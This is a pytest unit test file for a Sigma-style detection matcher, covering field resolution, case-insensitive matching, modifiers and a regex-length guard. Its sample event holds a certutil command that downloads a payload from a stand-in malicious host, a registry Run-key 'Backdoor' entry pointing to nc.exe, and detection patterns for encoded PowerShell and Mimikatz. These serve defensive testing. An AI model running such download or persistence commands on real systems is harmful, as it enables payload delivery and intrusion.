"""Unit tests for FieldMatcher modifier pipeline, case-insensitivity, and field resolution."""

from __future__ import annotations

from datetime import datetime, timezone

import pytest

from app.detection.matcher import FieldMatcher, pascal_to_snake
from app.models.events import EventCategory, NormalizedEvent


@pytest.fixture
def sample_event() -> NormalizedEvent:
    """Fixture providing a populated NormalizedEvent for matcher testing."""
    return NormalizedEvent(
        event_id=1,
        record_id=101,
        provider="Microsoft-Windows-Sysmon",
        channel="Microsoft-Windows-Sysmon/Operational",
        computer="WORKSTATION-01.corp.local",
        timestamp=datetime(2023, 4, 10, 14, 22, 15, tzinfo=timezone.utc),
        event_category=EventCategory.PROCESS,
        event_type="ProcessCreate",
        process_guid="{11111111-2222-3333-4444-555555555555}",
        process_id=4560,
        image=r"C:\Windows\System32\certutil.exe",
        command_line="certutil.exe -urlcache -split -f http://malicious.evil/payload.bin payload.exe",
        user=r"CORP\JohnDoe",
        parent_image=r"C:\Windows\System32\cmd.exe",
        parent_command_line="cmd.exe /c download.bat",
        destination_ip="192.168.1.100",
        destination_port=443,
        registry_target_object=r"HKLM\Software\Microsoft\Windows\CurrentVersion\Run\Backdoor",
        registry_details=r"C:\Windows\Temp\nc.exe",
        target_filename=r"C:\Users\JohnDoe\AppData\Local\Temp\evil.exe",
        hashes={"sha256": "abcdef1234567890", "md5": "1234567890abcdef"},
        extra_fields={
            "CustomField": "CustomValue123",
            "nested_flag": "Active",
        },
        raw_payload="<Event>RawXmlData</Event>",
        event_hash="test_hash_001",
    )


def test_pascal_to_snake_conversion() -> None:
    """Verify PascalCase conversion handles standard names and acronyms."""
    assert pascal_to_snake("CommandLine") == "command_line"
    assert pascal_to_snake("TargetFilename") == "target_filename"
    assert pascal_to_snake("DestinationIP") == "destination_ip"
    assert pascal_to_snake("EventID") == "event_id"
    assert pascal_to_snake("ParentImage") == "parent_image"
    assert pascal_to_snake("command_line") == "command_line"


def test_resolve_field_value_direct_snake_case(sample_event: NormalizedEvent) -> None:
    """Test 1: Verify resolve_field_value resolves direct snake_case attributes."""
    matcher = FieldMatcher()
    assert matcher.resolve_field_value(sample_event, "command_line") == sample_event.command_line
    assert matcher.resolve_field_value(sample_event, "image") == sample_event.image
    assert matcher.resolve_field_value(sample_event, "process_id") == 4560


def test_resolve_field_value_pascal_case_conversion(sample_event: NormalizedEvent) -> None:
    """Test 2: Verify resolve_field_value resolves PascalCase Sigma field names."""
    matcher = FieldMatcher()
    assert matcher.resolve_field_value(sample_event, "CommandLine") == sample_event.command_line
    assert matcher.resolve_field_value(sample_event, "TargetFilename") == sample_event.target_filename
    assert matcher.resolve_field_value(sample_event, "ParentCommandLine") == sample_event.parent_command_line
    assert matcher.resolve_field_value(sample_event, "EventId") == 1


def test_resolve_field_value_canonical_aliases(sample_event: NormalizedEvent) -> None:
    """Test 3: Verify resolve_field_value handles known field aliases."""
    matcher = FieldMatcher()
    assert matcher.resolve_field_value(sample_event, "TargetObject") == sample_event.registry_target_object
    assert matcher.resolve_field_value(sample_event, "Details") == sample_event.registry_details
    assert matcher.resolve_field_value(sample_event, "DestinationIp") == "192.168.1.100"
    assert matcher.resolve_field_value(sample_event, "DestinationIP") == "192.168.1.100"
    assert matcher.resolve_field_value(sample_event, "sha256") == "abcdef1234567890"


def test_resolve_field_value_from_extra_fields(sample_event: NormalizedEvent) -> None:
    """Test 4: Verify resolve_field_value queries event.extra_fields for missing attributes."""
    matcher = FieldMatcher()
    assert matcher.resolve_field_value(sample_event, "CustomField") == "CustomValue123"
    assert matcher.resolve_field_value(sample_event, "custom_field") == "CustomValue123"
    assert matcher.resolve_field_value(sample_event, "nested_flag") == "Active"


def test_resolve_field_value_absent_returns_none(sample_event: NormalizedEvent) -> None:
    """Test 5: Verify resolve_field_value returns None without raising exceptions if absent."""
    matcher = FieldMatcher()
    assert matcher.resolve_field_value(sample_event, "NonExistentField") is None
    assert matcher.resolve_field_value(sample_event, "wmi_consumer") is None


def test_default_case_insensitive_and_numeric_matching(sample_event: NormalizedEvent) -> None:
    """Test 6: Verify default matching performs case-insensitive string and exact numeric equality."""
    matcher = FieldMatcher()

    # Case-insensitive string match
    matched, ev = matcher.match_selection(sample_event, {"User": "corp\\johndoe"})
    assert matched is True
    assert ev[0].modifier == "exact"
    assert ev[0].matched_pattern == "corp\\johndoe"

    # Numeric equality
    matched, _ = matcher.match_selection(sample_event, {"event_id": 1, "process_id": 4560})
    assert matched is True

    # Numeric equality with string pattern
    matched, _ = matcher.match_selection(sample_event, {"event_id": "1"})
    assert matched is True

    # Mismatch
    matched, _ = matcher.match_selection(sample_event, {"User": "CORP\\Administrator"})
    assert matched is False


def test_contains_modifier(sample_event: NormalizedEvent) -> None:
    """Test 7: Verify |contains modifier performs case-insensitive substring search."""
    matcher = FieldMatcher()
    matched, ev = matcher.match_selection(
        sample_event,
        {"CommandLine|contains": "-URLCACHE"},
    )
    assert matched is True
    assert ev[0].field == "CommandLine"
    assert ev[0].modifier == "contains"

    matched, _ = matcher.match_selection(
        sample_event,
        {"CommandLine|contains": "-nonexistentflag"},
    )
    assert matched is False


def test_startswith_modifier(sample_event: NormalizedEvent) -> None:
    """Test 8: Verify |startswith modifier performs case-insensitive prefix match."""
    matcher = FieldMatcher()
    matched, ev = matcher.match_selection(
        sample_event,
        {"Image|startswith": r"c:\windows\system32"},
    )
    assert matched is True
    assert ev[0].modifier == "startswith"

    matched, _ = matcher.match_selection(
        sample_event,
        {"Image|startswith": r"c:\users"},
    )
    assert matched is False


def test_endswith_modifier(sample_event: NormalizedEvent) -> None:
    """Test 9: Verify |endswith modifier performs case-insensitive suffix match."""
    matcher = FieldMatcher()
    matched, ev = matcher.match_selection(
        sample_event,
        {"Image|endswith": r"\CERTUTIL.EXE"},
    )
    assert matched is True
    assert ev[0].modifier == "endswith"

    matched, _ = matcher.match_selection(
        sample_event,
        {"Image|endswith": r"\powershell.exe"},
    )
    assert matched is False


def test_regex_modifier_and_redos_guard(sample_event: NormalizedEvent) -> None:
    """Test 10: Verify |re modifier matches regex with case-insensitivity and enforces length limit."""
    matcher = FieldMatcher()

    # Valid regex matching
    matched, ev = matcher.match_selection(
        sample_event,
        {"CommandLine|re": r"certutil(\.exe)?\s+-urlcache"},
    )
    assert matched is True
    assert ev[0].modifier == "re"

    # Valid regex non-matching
    matched, _ = matcher.match_selection(
        sample_event,
        {"CommandLine|re": r"powershell\.exe\s+-enc"},
    )
    assert matched is False

    # Regex exceeding 250 characters must be rejected with ValueError (T-04-04 ReDoS safeguard)
    long_regex = "a" * 251
    with pytest.raises(ValueError, match="Regex pattern exceeds maximum allowed length"):
        matcher.match_selection(sample_event, {"CommandLine|re": long_regex})


def test_implicit_or_list_values(sample_event: NormalizedEvent) -> None:
    """Test 11: Verify list values behave as implicit OR by default."""
    matcher = FieldMatcher()

    # List where one pattern matches (cmd.exe does not match image, certutil.exe does)
    matched, ev = matcher.match_selection(
        sample_event,
        {"Image|endswith": [r"\cmd.exe", r"\certutil.exe", r"\powershell.exe"]},
    )
    assert matched is True
    assert len(ev) == 1
    assert ev[0].matched_pattern == r"\certutil.exe"

    # List where none matches
    matched, _ = matcher.match_selection(
        sample_event,
        {"Image|endswith": [r"\cmd.exe", r"\powershell.exe"]},
    )
    assert matched is False


def test_all_modifier_with_list(sample_event: NormalizedEvent) -> None:
    """Test 12: Verify |all modifier requires all list items to match the field."""
    matcher = FieldMatcher()

    # Both -urlcache and -split are present in CommandLine
    matched, ev = matcher.match_selection(
        sample_event,
        {"CommandLine|contains|all": ["-urlcache", "-split", "-f"]},
    )
    assert matched is True
    assert len(ev) == 3
    assert {e.matched_pattern for e in ev} == {"-urlcache", "-split", "-f"}

    # One item is missing (-decode is not present)
    matched, _ = matcher.match_selection(
        sample_event,
        {"CommandLine|contains|all": ["-urlcache", "-split", "-decode"]},
    )
    assert matched is False


def test_match_selection_composite_criteria(sample_event: NormalizedEvent) -> None:
    """Test 13: Verify match_selection returns (True, evidence) on all-match and (False, []) on any mismatch."""
    matcher = FieldMatcher()

    # Selection with multiple fields (all match)
    selection = {
        "Image|endswith": r"\certutil.exe",
        "CommandLine|contains": "-urlcache",
        "DestinationPort": 443,
    }
    matched, ev = matcher.match_selection(sample_event, selection)
    assert matched is True
    assert len(ev) == 3

    # One field mismatches (DestinationPort is 443, not 80)
    failing_selection = {
        "Image|endswith": r"\certutil.exe",
        "CommandLine|contains": "-urlcache",
        "DestinationPort": 80,
    }
    matched, ev = matcher.match_selection(sample_event, failing_selection)
    assert matched is False
    assert ev == []


def test_missing_or_null_fields_evaluate_to_false_safely(sample_event: NormalizedEvent) -> None:
    """Test 14: Verify missing or None event fields evaluate to False safely without errors."""
    matcher = FieldMatcher()

    # Field completely missing from schema
    matched, ev = matcher.match_selection(sample_event, {"UnknownSigmaField|contains": "test"})
    assert matched is False
    assert ev == []

    # Field present on schema but has None value in event (script_block_text is None for ProcessCreate)
    assert sample_event.script_block_text is None
    matched, ev = matcher.match_selection(sample_event, {"script_block_text|contains": "Invoke-Mimikatz"})
    assert matched is False
    assert ev == []

    # TargetProcessId is None
    matched, ev = matcher.match_selection(sample_event, {"target_process_id": 9999})
    assert matched is False
    assert ev == []
